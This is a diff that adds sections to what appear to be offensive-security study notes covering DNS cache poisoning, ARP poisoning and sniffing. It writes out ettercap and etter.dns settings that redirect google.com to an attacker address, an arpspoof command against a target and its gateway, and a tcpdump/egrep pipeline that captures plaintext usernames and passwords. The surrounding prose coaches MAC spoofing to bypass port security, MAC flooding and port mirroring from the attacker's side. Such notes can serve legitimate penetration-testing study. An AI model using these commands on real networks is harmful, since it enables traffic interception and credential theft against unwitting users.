@@ -233,7 +233,29 @@ Ettercap
 
 # DNS Cache Poisoning
 Ettercap: 
-Victim wants to go to Google.com | The attacker spoofs themself as the DNS server | Victim winds up going to a fake Google. <br>
+Attacker poisons ARP table with his MAC | Victim wants to go to Google.com | The attacker spoofs themself as the DNS server | Victim winds up going to a fake Google. <br>
+```
+root# sysctl -w net.ipv4.ip_forward=1
+net.ipv4.ip_forward = 1
+```
+```
+root# nano /etc/ettercap/etter.dns
+#####################################
+www.google.com   A    192.168.1.101 (Metasploit To Address)
+*.google.com.    A    192.168.1.101
+```
+```
+root# ettercap -g
+
+Primary Interface -> eth1
+Start
+Scan for host
+Victim Target 1
+Default Gateway Target 2
+Globe -> ARP Poisoning
+Manage Plugins -> dns_spoof
+```
+
 <br>
 Attacker sends his MAC to the victims ARP table and associates that with the Default Gateway. When the Victim wants to go to a domain the attacker receives the request and fowards it through the router to the internet. 
 
@@ -243,6 +265,29 @@ SSLStrip<br>
 Replay Attack<br>
 SSL Downgrade<br>
 DNS Cache Poisoning
+
+# ARP Poisoning Attack
+Make host act like Router:
+```
+root# sysctl -w net.ipv4.ip_forward=1
+net.ipv4.ip_forward = 1
+```
+```
+root# arpspoof -i eth1 -t <target_ip> <destination_gateway>
+```
+```
+root# tcpdump -i eth1 port http or port ftp -l -A | egrep "pass=|password=|user=|username=|login=|pass:|password:|user:|username:|login:|pass |user |PASS |USER "
+```
+# Sniffing
+MAC Spoofing - A common low-level security measure is port security. Port security allows only specific MAC addresses access to a switch. The goal is to ensure that only authorized devices have access to the network. A MAC address for a network interface card (NIC) is assigned by the manufacturer. This address is hard-coded directly into the NIC and can’t be changed. However, it is possible to change the MAC address of the interface driver. Let’s say you want to access a network, but the administrator has implemented port security measures. Thanks to your previous reconnaissance and scanning, you know that your target computer has access to the network, and you even know the MAC address. Using one of several software tools, you can spoof your computer’s MAC address to look like the target’s MAC address, and you can connect directly to the network with minimal effort.<br>
+
+MAC Flooding - When a switch is initially turned on, it doesn’t know which devices it’s going to be supporting. A switch tracks MAC addresses in a content addressable memory (CAM) table. As it receives packets from various MAC addresses, it adds the addresses to its CAM table and associates each one with a physical port on the switch. This process allows data to be sent directly to the port where the intended recipient is located instead of sending all data across the entire network like a hub. Although one port can have multiple MAC addresses associated with it, the CAM table is only so big. As a hacker, you can use a method called MAC flooding to intentionally flood the CAM table with Ethernet frames, each originating from different MAC addresses. Once the table starts to overflow, the switch responds by broadcasting all incoming data to all ports, basically turning itself into a hub instead of a switch. Since your MAC address is now connected to one of the ports, you are able to capture all traffic as it is broadcast across the network.
+<br>
+
+ARP Poisoning - Address Resolution Protocol (ARP) maps IP addresses to MAC addresses and provides the most efficient path for data transmission. ARP broadcasts are permitted to freely roam around the network. You can use this free flow of traffic to your advantage. By sending spoofed messages onto a network, you can associate your MAC address with the IP address of another host, preferably the default gateway. As a result, the target machine will send frames to your system, thinking that you are their gateway, before you forward them on to the original destination.
+<br>
+
+Port Mirroring - Port mirroring can be challenging to set up, but is possible depending on the level of access you’ve been able to obtain to a network. The concept behind port mirroring, also known as SPAN port, is actually pretty simple. Port mirroring creates a duplicate of all network traffic on a port and sends it to another device. If all traffic from a target machine is directed through the switch to the server, you can implement port mirroring. Port mirroring ensures that any time the data comes through, it is duplicated and sent out to the attacker’s machine as well.<br>
 
 # Network Access Control Bypass
 
